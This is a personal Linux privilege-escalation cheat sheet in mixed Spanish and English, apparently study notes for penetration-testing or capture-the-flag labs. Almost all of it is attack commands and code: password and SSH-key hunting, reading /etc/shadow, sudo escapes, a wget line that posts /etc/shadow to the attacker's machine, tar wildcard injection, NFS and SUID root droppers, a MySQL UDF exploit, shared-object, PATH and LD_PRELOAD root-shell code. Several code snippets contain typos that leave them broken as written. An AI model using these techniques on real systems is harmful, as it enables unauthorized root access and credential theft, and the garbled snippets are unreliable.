Enumeración del sistema
> hostname 
> uname -a //Lista todo la información del OS
> cat /proc/version 
	/etc/*release
	/etc/lsb-release
	/etc/redhat-release
	
> cat /etc/issue
> ps aux //Processos que esta corriendo actualmante 


 Enumeración de usuarios
> whoami
> id 
> sudo -l
> cat /etc/passwd
> cat /etc/shadow 
> cat /etc/group 


 Enumeración de las red
> ifconfig
> ip route 
> arp -a
> ip neigh
> netsat 

Password Huting
>grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always // Grep todo los archivos que tenga la palabra PASSWORD

Archivos que con permisos debiles
> cat /etc/passwd
> cat /etc/shadow
> unshadow passwd shadow
> find / -name authotirzed_key -type f 2>/dev/null
> find / -name id_rsa 2>/dev/null
> chmod 600 id_ rsa = ssh -i id_rsa user@ip -p port

Sudo
> sudo -l to see all the files
    > vim : sudo vim -c '!sh'
    > apache2 : sudo apache2 /etc/shadow //para veer los archivos que no estes autorizados
    > wget : --post-file=/etc/shadow to your machine....
```
Mas en GTFobins
```

Capabilities
> getcap -r / 2>/dev/null
> which python3
> usr/bin/python3 = ./python3 'import os; os.setuid(0); os.system("/bin/bash")'

Crontab
> normal path = cat /etc/crontab 
Wildcard

 create file for exploitation
> touch ruta "--checkpoint=1"
> touch ruta "--checkpoint-action=exec=sh shell.sh"
> echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
> echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > exploit.sh
> /tmp/bash -p
  vulnerable script
> tar cf archive.tar *

SUID

> find / -perm -4000 -type f 2>/dev/null
> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null //Busca todo los SUID y GUID
NFS

>cat /etc/exports
>Track for no_root_squash files = El directorio se puede montar monturas
>showmount -o <IP>
> mkdir /tmp/mountme
>mount -o rw.vers=2 <IP>:/tmp /tmp/mountme
> echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0}' > /tmp/mountme/x.c
>gcc /tmp/mountme/x.c -p /tmp/mountme/x
>chmod +x /tmp/mountme/x
> And execute ./x
   
 Exploits de servios  
   
   > 	cd /home/user/tools/mysql-udf
   >	gcc -g -c raptor_udf2.c -fPIC
   >	gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
   
   >mysql -u root 
   >use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
> /tmp/rootbash -p

   
Shared Object Injection

> find / -type f -perm -4000 -ls  2>/dev/null

> strace PATH 2>/dev/null
 //Hunt for no such file or directory and write a code which give us root shell permissions
  grep -i -E “open|acess|no such file”
  
  
  CODE::
  
  #include <stdio.h>
  #include <stdlib.h>
  
  stactic void injec() __attribute>>((constructor));
  
  void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");  
  }
  
  gcc -shared -fPIC -o /PATH/PATH/Original name.so 
  
  Binary Symlinks (nginx exploit)
  
  > dpkg -l | grep nginx 
  
  > We need the SUID set to Sudo to get the exploit work 
  >./nginxed-root.sh /var/log/nginx/error.log
  
  
	Enviromental
	
	> env 
	
	> find / -perm -4000 2>/dev/null
	
	find env suid's
	
	> echo “int main(){ setgui(0); setuid(0); system("/bin/bash"); return0;}” > /tmp/service.c
	> gcc /tmp/service.c -o /tmp/service
	> export path=/tmp:$PATH
	// execute the suid
	
	
		-Si llama desde /usr/bin/X tenemos otras vias de hacer esto
		
	function usr/sbin/service() {cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p;}	
	
	export -f /usr/sbin/service
	
	and execute the suid
	
	
	
		Apache2
				
		sudo apache2 -f /etc/shadow
		
	
		LD_PRELOAD
		
		sudo -l 
		
		code :
		
		#include <stdio.h>
		#include <sys/types.h>
		#include <stdlib.h>
		
		void_init(){
		unsetenv("LD_PRELOAD");
		setgid(0);
		setuid(0);
		system("/bin/bash")		
		
		}
			
		gcc -fPIC -shared -o /tmp/x.so x.c -nostarfiles
		
		sudo LD_PRELOAD=/tmp/.so apache2
